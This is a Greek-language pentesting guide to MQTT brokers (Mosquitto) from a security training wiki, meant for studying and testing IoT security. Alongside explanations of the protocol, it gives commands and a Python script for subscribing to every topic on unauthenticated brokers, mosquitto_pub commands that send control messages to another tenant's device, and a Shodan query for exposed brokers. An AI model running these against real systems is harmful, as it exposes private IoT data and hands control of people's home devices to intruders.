# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

**MQ Telemetry Transport (MQTT)** είναι γνωστό ως ένα **πρωτόκολλο ανταλλαγής μηνυμάτων publish/subscribe** που ξεχωρίζει για την εξαιρετική απλότητα και ελαφρότητά του. Το πρωτόκολλο αυτό έχει σχεδιαστεί ειδικά για περιβάλλοντα όπου οι συσκευές έχουν περιορισμένες δυνατότητες και λειτουργούν σε δίκτυα με χαμηλό εύρος ζώνης, υψηλή καθυστέρηση ή μη αξιόπιστες συνδέσεις. Οι βασικοί στόχοι του MQTT περιλαμβάνουν τη μείωση της χρήσης του δικτύου και τη μείωση των απαιτήσεων σε πόρους της συσκευής. Επιπλέον, στοχεύει στη διατήρηση αξιόπιστης επικοινωνίας και στην παροχή ενός επιπέδου διασφάλισης παράδοσης. Αυτοί οι στόχοι καθιστούν το MQTT εξαιρετικά κατάλληλο για τον αναπτυσσόμενο τομέα της επικοινωνίας μηχανής-προς-μηχανής (M2M) και του Διαδικτύου των Πραγμάτων (IoT), όπου είναι ουσιώδες να συνδεθεί αποτελεσματικά πλήθος συσκευών. Επιπλέον, το MQTT είναι ιδιαίτερα ωφέλιμο για κινητές εφαρμογές, όπου η εξοικονόμηση εύρους ζώνης και διάρκειας μπαταρίας είναι κρίσιμη.

**Προεπιλεγμένη θύρα:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Επιθεώρηση της κυκλοφορίας

Όταν ένα πακέτο **CONNECT** λαμβάνεται από brokers MQTT, αποστέλλεται ένα πακέτο **CONNACK** ως απάντηση. Αυτό το πακέτο περιέχει έναν κωδικό επιστροφής που είναι κρίσιμος για την κατανόηση της κατάστασης της σύνδεσης. Κωδικός επιστροφής **0x00** σημαίνει ότι τα credentials έχουν γίνει αποδεκτά, υποδεικνύοντας επιτυχή σύνδεση. Αντίθετα, κωδικός επιστροφής **0x05** σηματοδοτεί ότι τα credentials είναι άκυρα, εμποδίζοντας τη σύνδεση.

Για παράδειγμα, εάν ο broker απορρίψει τη σύνδεση λόγω άκυρων credentials, το σενάριο θα μοιάζει κάπως έτσι:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

Η Authentication είναι εντελώς προαιρετική και ακόμη και αν Authentication πραγματοποιείται, η Encryption δεν χρησιμοποιείται από προεπιλογή (credentials αποστέλλονται σε clear text). Επιθέσεις MITM μπορούν ακόμα να εκτελεστούν για να κλέψουν passwords.

Για να συνδεθείτε σε μια MQTT υπηρεσία μπορείτε να χρησιμοποιήσετε: https://github.com/bapowell/python-mqtt-client-shell και να κάνετε subscribe σε όλα τα topics κάνοντας:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Μπορείτε επίσης να χρησιμοποιήσετε [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Μπορείτε επίσης να χρησιμοποιήσετε:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Ή μπορείτε να **τρέξετε αυτόν τον κώδικα για να προσπαθήσετε να συνδεθείτε σε ένα MQTT service χωρίς authentication, να subscribe σε κάθε topic και να τα ακούσετε**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### The Publish/Subscribe Pattern <a href="#b667" id="b667"></a>

Το μοντέλο publish/subscribe αποτελείται από:

- **Publisher**: δημοσιεύει ένα μήνυμα σε ένα (ή πολλά) topic(s) στον broker.
- **Subscriber**: εγγράφεται σε ένα (ή πολλά) topic(s) στον broker και λαμβάνει όλα τα μηνύματα που στέλνονται από τον publisher.
- **Broker**: δρομολογεί όλα τα μηνύματα από τους publishers προς τους subscribers.
- **Topic**: αποτελείται από ένα ή περισσότερα επίπεδα που χωρίζονται με forward slash (π.χ., /smartshouse/livingroom/temperature).

### Packet Format <a href="#f15a" id="f15a"></a>

Κάθε πακέτο MQTT περιέχει ένα fixed header (Εικόνα 02).Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): Εκκινούμενο από τον client για να αιτηθεί σύνδεση στον server.
- CONNACK (2): Η επιβεβαίωση του server για επιτυχή σύνδεση.
- PUBLISH (3): Χρησιμοποιείται για να στείλει ένα μήνυμα από τον client προς τον server ή αντίστροφα.
- PUBACK (4): Επιβεβαίωση ενός PUBLISH πακέτου.
- PUBREC (5): Μέρος ενός πρωτοκόλλου παράδοσης μηνυμάτων που εξασφαλίζει ότι το μήνυμα λήφθηκε.
- PUBREL (6): Περαιτέρω διασφάλιση στην παράδοση μηνυμάτων, υποδεικνύοντας release του μηνύματος.
- PUBCOMP (7): Τελικό μέρος του πρωτοκόλλου παράδοσης μηνυμάτων, υποδεικνύει ολοκλήρωση.
- SUBSCRIBE (8): Αίτημα του client να ακούει μηνύματα από ένα topic.
- SUBACK (9): Η επιβεβαίωση του server για ένα αίτημα SUBSCRIBE.
- UNSUBSCRIBE (10): Αίτημα του client για διακοπή λήψης μηνυμάτων από ένα topic.
- UNSUBACK (11): Η απάντηση του server σε ένα αίτημα UNSUBSCRIBE.
- PINGREQ (12): Μήνυμα heartbeat που αποστέλλεται από τον client.
- PINGRESP (13): Απάντηση του server στο heartbeat μήνυμα.
- DISCONNECT (14): Εκκινείται από τον client για τερματισμό της σύνδεσης.
- Δύο τιμές, 0 και 15, είναι επισημασμένες ως reserved και η χρήση τους απαγορεύεται.

## IoT MQTT ecosystem attacks: plaintext brokers and topic ACL bypass

Πολλές καταναλωτικές IoT πλατφόρμες εκθέτουν MQTT brokers που χρησιμοποιούνται από δύο διακριτούς ρόλους:
- Συσκευές gateway/hub που γεφυρώνουν ραδιοπρωτόκολλα (π.χ., BLE/LoRa/Zigbee) με το cloud.
- Mobile apps ή web backends που ελέγχουν συσκευές μέσω “app” topics.

Συνηθισμένες αδυναμίες που μπορείτε να εκμεταλλευτείτε κατά τη διάρκεια ενός pentest:

- Plaintext MQTT σε μη τυπικές θύρες (π.χ., TCP/8001) αντί για MQTTS. Οποιοσδήποτε on-path παρατηρητής μπορεί να διαβάσει διαπιστευτήρια και control frames. Χρησιμοποιήστε Wireshark για να εντοπίσετε cleartext CONNECT/CONNACK και SUBSCRIBE/PUBLISH κίνηση σε ασυνήθιστες θύρες.
- Αδύναμα ή ανύπαρκτα per-tenant topic ACLs. Αν τα topics έχουν namespace μόνο από deviceId (π.χ., "/tenantless/<deviceId>/tx"), οποιοσδήποτε authenticated χρήστης μπορεί να PUBLISH σε συσκευές άλλων tenants.
- Sensitive data leakage μέσω maintenance/admin topics (π.χ., Wi‑Fi credentials broadcast σε cleartext μετά από αλλαγές config).

Examples (replace placeholders with real values):

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Έλεγχος μεταξύ tenants όταν τα ACLs είναι αδύναμα (δημοσίευση στο device topic άλλου tenant):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- Το MQTT σε απλό κείμενο σε μη-τυπικές θύρες είναι συνηθισμένο στο IoT. Εξετάστε την αναζήτηση για brokers σε εναλλακτικές θύρες και επιβεβαιώστε με protocol detection.

## Αναφορές

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
